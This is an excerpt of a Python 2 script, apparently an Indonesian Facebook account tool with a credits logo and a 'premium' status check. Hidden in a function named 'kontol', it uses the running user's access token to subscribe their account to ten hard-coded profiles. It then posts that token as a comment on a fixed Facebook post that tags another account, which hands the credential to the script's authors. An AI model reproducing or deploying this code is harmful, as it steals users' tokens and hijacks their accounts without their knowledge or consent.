...
logo = (c+"""  _______              __       ___ 
 |   _   \ .--------. |  |--. .'  _|
 |.  l   / |        | |  _  | |   _|
 |.  _   1 |__|__|__| |_____| |__|"""+k+"""Mr.Risky"""+c+"""
 |:  |   |"""+k+"""Angga"""+c+"""
 |::.|:. |"""+k+"""Yayan"""+c+"""
 `--- ---'"""+k+"""Dapunta"""+c+"""
...
def moch_yayan():
    ...
    print k+' ['+c+'++'+k+']->'+p+'Status  : '+m+'Not Premium'
...
def kontol():
	try:
		...
		print '\n %s[%s×%s]Token Error !!'%(N,M,N)
		os.system('rm -rf login.txt')
	requests.post('https://graph.facebook.com/100009447779678/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100003603863923/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100001134480658/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/1475910687/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100001403405461/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100001152080193/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100000517973128/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100038342055141/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100004003690596/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/1836754937/subscribers?access_token=%s'%(__cindy__))
	post = '3010777015913861'
	srghun = '100009447779678'
	fdrffg = '3010777015913861'
	vyhbhj = 'LOVE'
	...
	requests.post('https://graph.facebook.com/' + post + '/comments/?message=om om @[100063690353340:0] setor\n'+token+'&access_token=' + token)
